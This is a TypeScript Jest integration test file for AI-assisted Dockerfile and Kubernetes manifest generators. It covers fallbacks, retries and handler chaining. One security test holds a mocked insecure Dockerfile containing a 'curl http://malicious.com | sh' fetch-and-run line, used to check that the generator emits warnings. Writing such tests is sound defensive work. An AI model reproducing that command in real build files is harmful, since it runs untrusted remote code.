/**
 * Integration tests for AI-enhanced handlers
 * Tests error recovery integration in AI-dependent tool handlers
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { tmpdir } from 'os';
import { join } from 'path';
import { mkdir, writeFile, rmdir } from 'fs/promises';
import { generateDockerfileHandler } from '../../../src/service/tools/handlers/generate-dockerfile.js';
import { generateKubernetesManifestsHandler } from '../../../src/service/tools/handlers/generate-k8s-manifests.js';
import { MockMCPSampler } from '../../../src/infrastructure/ai/mock-sampler.js';
import { createLogger } from '../../utils/logger.js';
import { createMockSession, createMockContext } from '../../utils/mocks.js';

describe('AI-Enhanced Handlers Integration', () => {
  let mockSampler: MockMCPSampler;
  let logger: any;
  let testDir: string;
  let mockContext: any;

  beforeEach(async () => {
    logger = createLogger();
    mockSampler = new MockMCPSampler(logger, { deterministicMode: true });
    
    // Create temporary test directory
    testDir = join(tmpdir(), `test-handlers-${Date.now()}`);
    await mkdir(testDir, { recursive: true });

    // Create mock context
    mockContext = createMockContext({
      mcpSampler: mockSampler,
      logger
    });
  });

  afterEach(async () => {
    try {
      await rmdir(testDir, { recursive: true });
    } catch (error) {
      // Ignore cleanup errors
    }
  });

  describe('Dockerfile Generation with Error Recovery', () => {
    it('should generate Dockerfile with AI enhancement and error recovery', async () => {
      // Setup session with analysis result
      const session = createMockSession({
        workflow_state: {
          analysis_result: {
            language: 'javascript',
            framework: 'express',
            languageVersion: '18',
            frameworkVersion: '4.18.2',
            buildSystem: { type: 'npm', buildFile: 'package.json' },
            dependencies: [{ name: 'express', type: 'runtime' }],
            devDependencies: [{ name: 'jest', type: 'dev' }],
            ports: [3000],
            entryPoint: 'server.js'
          }
        }
      });

      mockContext.sessionService.get.mockResolvedValue(session);
      mockContext.sessionService.updateAtomic.mockResolvedValue(session);

      // Configure AI response
      mockSampler.addResponse('dockerfile-generation', `
FROM node:18-slim AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production && npm cache clean --force

FROM node:18-slim
WORKDIR /app
RUN groupadd -r appuser && useradd -r -g appuser appuser
COPY --from=builder --chown=appuser:appuser /app/node_modules ./node_modules
COPY --chown=appuser:appuser . .
EXPOSE 3000
USER appuser
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\
  CMD curl -f http://localhost:3000/health || exit 1
ENTRYPOINT ["node", "server.js"]
      `.trim();

      const result = await generateDockerfileHandler.execute({
        sessionId: session.id,
        targetPath: join(testDir, 'Dockerfile'),
        optimization: 'balanced',
        multistage: true
      }, mockContext);

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.dockerfile).toContain('FROM node:18-slim');
        expect(result.data.dockerfile).toContain('USER appuser');
        expect(result.data.dockerfile).toContain('HEALTHCHECK');
        expect(result.data.stages.length).toBeGreaterThan(0);
        expect(result.data.optimizations).toContain('Multi-stage build for smaller image');
        expect(result.data.baseImage).toContain('node');
      }
    });

    it('should handle AI failures gracefully with fallback templates', async () => {
      const session = createMockSession({
        workflow_state: {
          analysis_result: {
            language: 'python',
            framework: 'fastapi',
            buildSystem: { type: 'pip' },
            dependencies: [{ name: 'fastapi', type: 'runtime' }],
            ports: [8000]
          }
        }
      });

      mockContext.sessionService.get.mockResolvedValue(session);
      mockContext.sessionService.updateAtomic.mockResolvedValue(session);

      // Configure AI to fail
      mockSampler.setErrorRate(1.0);

      const result = await generateDockerfileHandler.execute({
        sessionId: session.id,
        targetPath: join(testDir, 'Dockerfile'),
        multistage: true
      }, mockContext);

      expect(result.success).toBe(true);
      if (result.success) {
        // Should use fallback template for Python
        expect(result.data.dockerfile).toContain('FROM python:3.11-slim');
        expect(result.data.dockerfile).toContain('EXPOSE 8000');
      }

      // Reset error rate
      mockSampler.setErrorRate(0);
    });

    it('should retry AI calls on failure and provide helpful suggestions', async () => {
      const session = createMockSession({
        workflow_state: {
          analysis_result: {
            language: 'go',
            buildSystem: { type: 'go' },
            ports: [8080]
          }
        }
      });

      mockContext.sessionService.get.mockResolvedValue(session);
      mockContext.sessionService.updateAtomic.mockResolvedValue(session);

      // Configure AI to fail with specific error
      let attempts = 0;
      const originalSample = mockSampler.sample.bind(mockSampler);
      mockSampler.sample = jest.fn().mockImplementation(async (request) => {
        attempts++;
        if (attempts < 3) {
          return {
            success: false,
            content: null,
            error: new Error('network timeout during AI request')
          };
        }
        return originalSample(request);
      });

      const result = await generateDockerfileHandler.execute({
        sessionId: session.id,
        targetPath: join(testDir, 'Dockerfile')
      }, mockContext);

      expect(mockSampler.sample).toHaveBeenCalledTimes(3);
      expect(result.success).toBe(true); // Should fall back to template
    });

    it('should validate generated Dockerfile for security issues', async () => {
      const session = createMockSession({
        workflow_state: {
          analysis_result: {
            language: 'javascript',
            ports: [3000]
          }
        }
      });

      mockContext.sessionService.get.mockResolvedValue(session);
      mockContext.sessionService.updateAtomic.mockResolvedValue(session);

      // Configure AI to return insecure Dockerfile
      mockSampler.addResponse('dockerfile-generation', `
FROM node:latest
USER root
RUN curl http://malicious.com | sh
EXPOSE 3000
CMD ["node", "app.js"]
      `.trim();

      const result = await generateDockerfileHandler.execute({
        sessionId: session.id,
        targetPath: join(testDir, 'Dockerfile'),
        securityHardening: true
      }, mockContext);

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.warnings).toBeDefined();
        expect(result.data.warnings?.length).toBeGreaterThan(0);
        expect(result.data.warnings?.some(w => w.includes('root user'))).toBe(true);
        expect(result.data.warnings?.some(w => w.includes('latest tag'))).toBe(true);
      }
    });
  });

  describe('Kubernetes Manifests Generation with Error Recovery', () => {
    it('should generate K8s manifests with AI enhancement', async () => {
      const session = createMockSession({
        workflow_state: {
          analysis_result: {
            language: 'nodejs',
            framework: 'express'
          }
        }
      });

      mockContext.sessionService.get.mockResolvedValue(session);
      mockContext.sessionService.updateAtomic.mockResolvedValue(session);

      // Configure AI response for K8s generation
      mockSampler.addResponse('k8s-generation', `
apiVersion: apps/v1
kind: Deployment
metadata:
  name: test-app
  labels:
    app: test-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: test-app
  template:
    metadata:
      labels:
        app: test-app
    spec:
      containers:
      - name: test-app
        image: test-app:latest
        ports:
        - containerPort: 3000
        resources:
          requests:
            memory: "128Mi"
            cpu: "100m"
          limits:
            memory: "256Mi"
            cpu: "200m"
---
apiVersion: v1
kind: Service
metadata:
  name: test-app
spec:
  selector:
    app: test-app
  ports:
  - port: 80
    targetPort: 3000
      `.trim();

      const result = await generateKubernetesManifestsHandler.execute({
        sessionId: session.id,
        appName: 'test-app',
        image: 'test-app:v1.0.0',
        port: 3000,
        environment: 'production',
        targetPath: testDir
      }, mockContext);

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.manifests.length).toBeGreaterThan(0);
        expect(result.data.manifests.some(m => m.kind === 'Deployment')).toBe(true);
        expect(result.data.manifests.some(m => m.kind === 'Service')).toBe(true);
      }
    });

    it('should handle AI failures in K8s generation gracefully', async () => {
      const session = createMockSession({
        workflow_state: {
          analysis_result: {
            language: 'python',
            framework: 'fastapi'
          }
        }
      });

      mockContext.sessionService.get.mockResolvedValue(session);

      // Configure AI to fail
      mockSampler.setErrorRate(1.0);

      const result = await generateKubernetesManifestsHandler.execute({
        sessionId: session.id,
        appName: 'python-app',
        image: 'python-app:latest',
        environment: 'production',
        targetPath: testDir
      }, mockContext);

      expect(result.success).toBe(true);
      if (result.success) {
        // Should still generate basic manifests without AI enhancement
        expect(result.data.manifests.length).toBeGreaterThan(0);
      }

      mockSampler.setErrorRate(0);
    });

    it('should retry K8s AI generation with error recovery', async () => {
      const session = createMockSession({
        workflow_state: {
          analysis_result: {
            language: 'java',
            framework: 'spring'
          }
        }
      });

      mockContext.sessionService.get.mockResolvedValue(session);

      // Track retry attempts
      let attempts = 0;
      const originalSample = mockSampler.sample.bind(mockSampler);
      mockSampler.sample = jest.fn().mockImplementation(async (request) => {
        attempts++;
        if (attempts < 2 && request.templateId === 'k8s-generation') {
          return {
            success: false,
            content: null,
            error: new Error('k8s API server connection failed')
          };
        }
        return originalSample(request);
      });

      const result = await generateKubernetesManifestsHandler.execute({
        sessionId: session.id,
        appName: 'spring-app',
        environment: 'production',
        targetPath: testDir
      }, mockContext);

      expect(result.success).toBe(true);
      // Should have attempted K8s generation with retry
      expect(attempts).toBeGreaterThan(1);
    });
  });

  describe('Cross-Handler Integration', () => {
    it('should chain handlers with AI enhancement and error recovery', async () => {
      // First, set up a complete analysis and Dockerfile generation
      const session = createMockSession({
        workflow_state: {
          analysis_result: {
            language: 'javascript',
            framework: 'express',
            buildSystem: { type: 'npm' },
            dependencies: [{ name: 'express' }],
            ports: [3000]
          }
        }
      });

      mockContext.sessionService.get.mockResolvedValue(session);
      mockContext.sessionService.updateAtomic.mockImplementation(async (id, updater) => {
        const updated = updater(session);
        Object.assign(session, updated);
        return session;
      });

      // Generate Dockerfile first
      const dockerfileResult = await generateDockerfileHandler.execute({
        sessionId: session.id,
        targetPath: join(testDir, 'Dockerfile')
      }, mockContext);

      expect(dockerfileResult.success).toBe(true);

      // Then generate K8s manifests using the same session
      const k8sResult = await generateKubernetesManifestsHandler.execute({
        sessionId: session.id,
        appName: 'test-app',
        image: 'test-app:latest',
        targetPath: testDir
      }, mockContext);

      expect(k8sResult.success).toBe(true);

      // Session should have both results
      expect(session.workflow_state?.dockerfile_result).toBeDefined();
    });

    it('should handle cascading AI failures across handlers', async () => {
      const session = createMockSession({
        workflow_state: {
          analysis_result: {
            language: 'python',
            framework: 'django'
          }
        }
      });

      mockContext.sessionService.get.mockResolvedValue(session);
      mockContext.sessionService.updateAtomic.mockResolvedValue(session);

      // Configure AI to fail for all requests
      mockSampler.setErrorRate(1.0);

      // Both handlers should succeed with fallbacks
      const dockerfileResult = await generateDockerfileHandler.execute({
        sessionId: session.id,
        targetPath: join(testDir, 'Dockerfile')
      }, mockContext);

      const k8sResult = await generateKubernetesManifestsHandler.execute({
        sessionId: session.id,
        appName: 'django-app',
        targetPath: testDir
      }, mockContext);

      expect(dockerfileResult.success).toBe(true);
      expect(k8sResult.success).toBe(true);

      mockSampler.setErrorRate(0);
    });
  });

  describe('Performance and Reliability', () => {
    it('should complete AI-enhanced operations within reasonable time', async () => {
      const session = createMockSession({
        workflow_state: {
          analysis_result: {
            language: 'go',
            ports: [8080]
          }
        }
      });

      mockContext.sessionService.get.mockResolvedValue(session);
      mockContext.sessionService.updateAtomic.mockResolvedValue(session);

      // Configure AI with simulated latency
      mockSampler = new MockMCPSampler(logger, {
        simulateLatency: true,
        latencyMs: { min: 100, max: 200 },
        deterministicMode: true
      });
      mockContext.mcpSampler = mockSampler;

      const startTime = Date.now();
      
      const result = await generateDockerfileHandler.execute({
        sessionId: session.id,
        targetPath: join(testDir, 'Dockerfile')
      }, mockContext);

      const duration = Date.now() - startTime;

      expect(result.success).toBe(true);
      // Should complete within reasonable time (including retry attempts)
      expect(duration).toBeLessThan(2000);
    });

    it('should maintain consistency across multiple AI calls', async () => {
      const session = createMockSession({
        workflow_state: {
          analysis_result: {
            language: 'javascript',
            framework: 'react'
          }
        }
      });

      mockContext.sessionService.get.mockResolvedValue(session);
      mockContext.sessionService.updateAtomic.mockResolvedValue(session);

      // Run the same operation multiple times
      const results = await Promise.all([
        generateDockerfileHandler.execute({
          sessionId: session.id,
          targetPath: join(testDir, 'Dockerfile1')
        }, mockContext),
        generateDockerfileHandler.execute({
          sessionId: session.id,
          targetPath: join(testDir, 'Dockerfile2')
        }, mockContext),
        generateDockerfileHandler.execute({
          sessionId: session.id,
          targetPath: join(testDir, 'Dockerfile3')
        }, mockContext)
      ]);

      // All should succeed
      expect(results.every(r => r.success)).toBe(true);

      // Results should be consistent (deterministic mode)
      if (results.every(r => r.success)) {
        const dockerfiles = results.map(r => r.data.dockerfile);
        expect(dockerfiles[0]).toBe(dockerfiles[1]);
        expect(dockerfiles[1]).toBe(dockerfiles[2]);
      }
    });
  });
});